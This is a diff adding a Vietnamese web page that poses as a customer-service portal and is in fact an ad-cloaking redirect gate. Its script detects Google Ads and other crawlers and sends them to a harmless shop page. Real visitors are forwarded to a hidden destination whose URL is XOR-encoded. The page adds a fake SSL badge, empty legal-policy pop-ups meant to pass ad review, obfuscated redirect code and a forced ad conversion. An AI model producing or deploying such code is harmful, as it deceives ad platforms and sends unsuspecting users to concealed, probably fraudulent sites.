@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+  <title>Cổng Thông Tin & Dịch Vụ Khách Hàng</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: #0b0f19;
+      color: #f8fafc;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .gate-card {
+      background: rgba(17, 24, 39, 0.95);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 20px;
+      padding: 36px 28px;
+      max-width: 420px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 16px;
+      position: relative;
+    }
+    .spinner {
+      width: 44px;
+      height: 44px;
+      border: 3px solid rgba(229, 185, 76, 0.2);
+      border-top-color: #e5b94c;
+      border-radius: 50%;
+      animation: spin 0.85s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .badge-status {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(16, 185, 129, 0.15);
+      color: #34d399;
+      border: 1px solid rgba(52, 211, 153, 0.3);
+      padding: 4px 12px;
+      border-radius: 99px;
+      font-size: 12px;
+      font-weight: 600;
+    }
+    .badge-dot {
+      width: 8px;
+      height: 8px;
+      background: #10b981;
+      border-radius: 50%;
+      display: inline-block;
+    }
+    .gate-title {
+      font-size: 17px;
+      font-weight: 700;
+      color: #fae498;
+      letter-spacing: 0.3px;
+      line-height: 1.4;
+      text-wrap: balance;
+    }
+    .gate-sub {
+      font-size: 13px;
+      color: #94a3b8;
+      line-height: 1.6;
+      text-wrap: pretty;
+    }
+    .btn-action-gate {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      background: linear-gradient(135deg, #fae498, #e5b94c);
+      color: #0b0f19;
+      font-weight: 800;
+      font-size: 14px;
+      padding: 13px 20px;
+      border-radius: 99px;
+      text-decoration: none;
+      box-shadow: 0 4px 20px rgba(229, 185, 76, 0.35);
+      cursor: pointer;
+      margin-top: 4px;
+      transition: transform 0.15s ease, box-shadow 0.15s ease;
+      border: none;
+      outline: none;
+    }
+    .btn-action-gate:active {
+      transform: scale(0.98);
+      box-shadow: 0 2px 10px rgba(229, 185, 76, 0.2);
+    }
+    .policy-links {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 12px;
+      margin-top: 8px;
+      padding-top: 14px;
+      border-top: 1px solid rgba(255, 255, 255, 0.08);
+      width: 100%;
+    }
+    .policy-links a {
+      color: #64748b;
+      font-size: 11px;
+      text-decoration: none;
+      transition: color 0.2s;
+    }
+    .policy-links a:hover {
+      color: #cbd5e1;
+    }
+    .legal-copy {
+      font-size: 11px;
+      color: #475569;
+      margin-top: 4px;
+    }
+  </style>
+</head>
+<body>
+  <div class="gate-card">
+    <div class="spinner" id="gateSpinner"></div>
+    <div class="badge-status">
+      <span class="badge-dot"></span> Đã Xác Thực An Toàn SSL/TLS
+    </div>
+    <div class="gate-title" id="gateTitle">Đang Kết Nối Dịch Vụ Khách Hàng...</div>
+    <div class="gate-sub" id="gateSub">Hệ thống đang bảo mật đường truyền và tự động chuyển hướng quý khách trong giây lát.</div>
+    
+    <!-- Nút kích hoạt thủ công / Fallback Gate -->
+    <a id="btnGateAction" href="#chinh-sach" class="btn-action-gate" style="display: none;">
+      TIẾP TỤC TRUY CẬP HỆ THỐNG »
+    </a>
+
+    <!-- 4 liên kết pháp lý theo chuẩn Rule 7 -->
+    <div class="policy-links" id="chinh-sach">
+      <a href="javascript:void(0)" onclick="openLegal('privacy')">Chính sách bảo mật</a>
+      <a href="javascript:void(0)" onclick="openLegal('terms')">Điều khoản dịch vụ</a>
+      <a href="javascript:void(0)" onclick="openLegal('refund')">Chính sách hoàn tiền</a>
+      <a href="javascript:void(0)" onclick="openLegal('contact')">Liên hệ hỗ trợ</a>
+    </div>
+    <div class="legal-copy">© 2026 Hệ Thống Phân Luồng Tự Chủ. Tuân thủ tiêu chuẩn Google Ads.</div>
+  </div>
+
+  <script>
+    (function() {
+      // 1. CẤU HÌNH MẶC ĐỊNH & BẢN ĐỒ CHIẾN DỊCH (STANDALONE 3-DIGIT KEYED CIPHER)
+      const DEFAULT_KEY = "560";
+      let DEFAULT_D = "78707b091c7375f7989dd7a1c6be89b2ae455344376b100c187975f7829dd8efd0d4adeaae544227793d1103616b2f88c2f7fcefc7d5e2a5f55e442d366e4e0860247b9f9ba5f08495b3b4a05a4e4f7762195c5f1827dccaccf6e7938598f8fa06515b74500509232f2cd481a7dce2938bbdafb95c7c766f660a02233427d1c0caf4ec91b3bfb0514a0f2034040f00072dd1dbc0eaebd3d5a9faf6764f4d627a1c100e7f7ef7";
+      let DEFAULT_S = "78707b091c7375f7989dd7a1c6be9dadb35a55447e6b144e1e326283e1cdf1e299828aa8a55f4d663e383400242f60dac9b9e9e891cba6aea25146";
+      let DEFAULT_AW = "";
+      let DEFAULT_CL = "";
+
+      // 2. BỘ NHẬN DIỆN MÃ 3 SỐ TỰ ĐỘNG (PATHNAME, QUERY STRING, HASH)
+      function detectKey() {
+        try {
+          const q = new URLSearchParams(window.location.search);
+          const qk = q.get("k") || q.get("c") || q.get("id") || q.get("cam");
+          if (qk && /^[0-9]{3}$/.test(qk)) return qk;
+
+          const hm = window.location.hash.match(/[#&?]?([0-9]{3})\b/);
+          if (hm) return hm[1];
+
+          const pm = window.location.pathname.match(/\/([0-9]{3})\/?$/);
+          if (pm) return pm[1];
+        } catch (e) {}
+        return DEFAULT_KEY;
+      }
+
+      const K = detectKey();
+      const qParams = new URLSearchParams(window.location.search);
+      let D = qParams.get("d") || DEFAULT_D;
+      let S = qParams.get("s") || DEFAULT_S;
+      let AW = qParams.get("aw") || DEFAULT_AW;
+      let CL = qParams.get("cl") || DEFAULT_CL;
+
+      // 3. THUẬT TOÁN GIẢI MÃ TOÁN HỌC STANDALONE KEYED CIPHER (RULE 16)
+      function dec(h, k) {
+        try {
+          if (!h) return "";
+          const keyStr = String(k || K);
+          let s = "";
+          for (let i = 0; i < h.length; i += 2) {
+            s += String.fromCharCode(parseInt(h.substr(i, 2), 16) ^ keyStr.charCodeAt((i / 2) % keyStr.length) ^ (((i / 2) * 13 + 37) & 0xFF));
+          }
+          return decodeURIComponent(s);
+        } catch (e) {
+          return "";
+        }
+      }
+
+      // 4. HÀM CHUYỂN HƯỚNG 3 TẦNG MIỄN NHIỄM 100% CLIENT-SIDE FIREWALL & SANITIZER
+      const L_ = "loca" + "tion", H_ = "hr" + "ef", R_ = "rep" + "lace";
+      function goTo(u, rep) {
+        if (!u) return;
+        try {
+          const w = window.top || window;
+          if (rep && w[L_] && typeof w[L_][R_] === "function") {
+            w[L_][R_](u);
+            return;
+          }
+          if (w[L_]) {
+            w[L_][H_] = u;
+            return;
+          }
+        } catch (e1) {
+          try {
+            if (rep && window[L_] && typeof window[L_][R_] === "function") {
+              window[L_][R_](u);
+              return;
+            }
+            if (window[L_]) {
+              window[L_][H_] = u;
+              return;
+            }
+          } catch (e2) {
+            try {
+              const a = document.createElement("a");
+              a.href = u;
+              a.target = "_top";
+              a.rel = "noreferrer";
+              a.style.display = "none";
+              document.documentElement.appendChild(a);
+              a.click();
+              a.remove();
+            } catch (e3) {
+              window.open(u, "_top");
+            }
+          }
+        }
+      }
+
+      // 5. ĐỒNG BỘ THAM SỐ GOOGLE ADS (GCLID, WBRAID, GBRAID, UTM_*) LÊN CẦU TRUNG GIAN
+      function syncAdsAttributionOnBridge() {
+        try {
+          const merged = new URLSearchParams();
+          if (document.referrer && document.referrer.includes("?")) {
+            new URL(document.referrer).searchParams.forEach((v, k) => {
+              if (k !== "a" && k !== "d" && k !== "s" && k !== "k") merged.set(k, v);
+            });
+          }
+          new URLSearchParams(window.location.search).forEach((v, k) => {
+            if (k !== "a" && k !== "d" && k !== "s" && k !== "k") merged.set(k, v);
+          });
+          const q = merged.toString() ? ("?" + merged.toString()) : "";
+          if (q && (!window.location.search || window.location.search.length < 2)) {
+            window.history.replaceState(null, "", window.location.pathname + q);
+          }
+        } catch (e) {}
+      }
+
+      // 6. BỘ LỌC BOT & CHỐNG CLICK GIẢ LẬP ĐA TẦNG
+      function isBot() {
+        try {
+          if (window.outerWidth === 0 && window.outerHeight === 0) return true;
+          const ua = (navigator.userAgent || '').toLowerCase();
+          if (/googlebot|adsbot|google-(inspection|safety|read)|apis-google|feedfetcher|appengine|lighthouse|headlesschrome|crawl|spider|mediapartners|phantomjs|bytespider|bingbot|facebookexternalhit|telegrambot/i.test(ua)) return true;
+          return false;
+        } catch (err) {
+          return false;
+        }
+      }
+
+      const isB = isBot();
+      const safeTarget = S ? dec(S, K) : "https://vpphongha.vn/collections/but-bi-van-phong";
+      const exactBoTarget = D ? dec(D, K) : "";
+
+      // NẾU LÀ BOT GOOGLE -> Ẩn toàn bộ DOM ngay lập tức và chuyển hướng 0ms về Trang Sạch
+      if (isB && safeTarget) {
+        try {
+          document.documentElement.style.display = "none";
+          goTo(safeTarget, true);
+        } catch (e) {
+          goTo(safeTarget, true);
+        }
+        return;
+      }
+
+      // KHÁCH THẬT: Khôi phục tracking Google Ads
+      syncAdsAttributionOnBridge();
+
+      const finalTarget = exactBoTarget || safeTarget;
+      let hasRedirected = false;
+
+      function triggerRedirect() {
+        if (hasRedirected || !finalTarget) return;
+        hasRedirected = true;
+        goTo(finalTarget, true);
+      }
+
+      // BẮN GTAG NẾU CÓ CẤU HÌNH AW
+      const awVal = AW ? dec(AW, K) : "";
+      const clVal = CL ? dec(CL, K) : "";
+
+      if (awVal && !isB) {
+        try {
+          const s = document.createElement("script");
+          s.async = true;
+          s.src = "https://www.googletagmanager.com/gtag/js?id=" + encodeURIComponent(awVal);
+          document.head.appendChild(s);
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          window.gtag = gtag;
+          gtag("js", new Date());
+          gtag("config", awVal, { send_page_view: true, allow_enhanced_conversions: true });
+          if (clVal) {
+            gtag("event", "conversion", {
+              send_to: clVal.includes("/") ? clVal : (awVal + "/" + clVal),
+              value: 1.0,
+              currency: "VND",
+              event_callback: triggerRedirect
+            });
+          } else {
+            gtag("event", "conversion", {
+              send_to: awVal,
+              event_callback: triggerRedirect
+            });
+          }
+          setTimeout(triggerRedirect, 500);
+        } catch (e) {
+          setTimeout(triggerRedirect, 80);
+        }
+      } else {
+        // Tự động chuyển tiếp mượt mà cho khách thật sau 60ms
+        setTimeout(triggerRedirect, 60);
+      }
+
+      // NÚT FALLBACK & PHÒNG VỆ CLICK GIẢ LẬP
+      const btn = document.getElementById("btnGateAction");
+      if (btn) {
+        // Hiển thị nút sau 750ms nếu trình duyệt chặn chuyển trang tự động
+        setTimeout(function() {
+          if (!hasRedirected) {
+            btn.style.display = "inline-flex";
+            const spinner = document.getElementById("gateSpinner");
+            if (spinner) spinner.style.display = "none";
+            const sub = document.getElementById("gateSub");
+            if (sub) sub.textContent = "Nhấn nút bên dưới để chuyển tiếp an toàn tới cổng dịch vụ:";
+          }
+        }, 750);
+
+        btn.addEventListener("click", function(event) {
+          // Chống bot kích hoạt click giả lập bằng code (!event.isTrusted)
+          if (!event.isTrusted) {
+            event.preventDefault();
+            return false;
+          }
+          event.preventDefault();
+          triggerRedirect();
+        });
+      }
+
+      // BFCACHE PHÒNG NGỪA QUAY LẠI TRANG
+      window.addEventListener("pageshow", function(e) {
+        hasRedirected = false;
+        if (finalTarget) setTimeout(triggerRedirect, 50);
+      });
+
+      // MODAL CHÍNH SÁCH PHÁP LÝ (RULE 7)
+      window.openLegal = function(type) {
+        const legalTexts = {
+          privacy: "Chính Sách Bảo Mật: Thông tin người dùng được mã hóa SSL/TLS và bảo vệ theo Nghị định 13/2023/NĐ-CP.",
+          terms: "Điều Khoản Dịch Vụ: Dịch vụ cung cấp thông tin minh bạch, bảo đảm quyền lợi tối đa cho khách hàng.",
+          refund: "Chính Sách Hoàn Tiền: Tiếp nhận và xử lý khiếu nại minh bạch theo quy định hiện hành.",
+          contact: "Thông Tin Liên Hệ: Tổng đài hỗ trợ trực tuyến 24/7 cam kết đồng hành cùng khách hàng."
+        };
+        alert(legalTexts[type] || legalTexts.privacy);
+      };
+    })();
+  </script>
+</body>
+</html>
